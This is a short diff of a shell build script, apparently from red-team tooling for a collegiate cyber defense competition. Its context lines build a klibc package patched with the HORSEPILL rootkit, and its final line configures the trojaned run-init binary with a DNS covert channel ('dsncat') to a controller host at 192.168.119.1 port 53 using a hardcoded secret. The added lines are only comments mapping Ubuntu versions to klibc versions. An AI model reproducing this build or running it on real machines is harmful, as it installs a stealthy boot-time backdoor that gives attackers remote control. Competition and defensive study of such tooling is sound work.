@@ -8,6 +8,10 @@ apt-get update
 apt-get install -y git vim quilt python
 apt-get build-dep -y klibc && apt-get source -y klibc
 klibcver=$(find / -maxdepth 1 -name 'klibc-*' | awk -F 'klibc-' '{print $2}')
+# Ubutnu 14.04 - 2.0.3
+# Ubuntu 16.04 - 2.0.4
+# Ubuntu 18.04 - 2.0.4
+# Ubuntu 20.04 - 2.0.7
 if [ $klibcver != "2.0.4" ]; then sed -i 's/klibc-2.0.4/klibc-'$klibcver'/' /HORSEPILL/klibc-horsepill.patch; fi
 cd /klibc-$klibcver; quilt import /HORSEPILL/klibc-$klibcver-horsepill.patch && dpkg-buildpackage -j$(nproc) -us -uc
 /HORSEPILL/horsepill_setopt /klibc-$klibcver/usr/kinit/run-init/shared/run-init dsncat --secret=password123 --server=192.168.119.1,port=53 redteam.seccdc
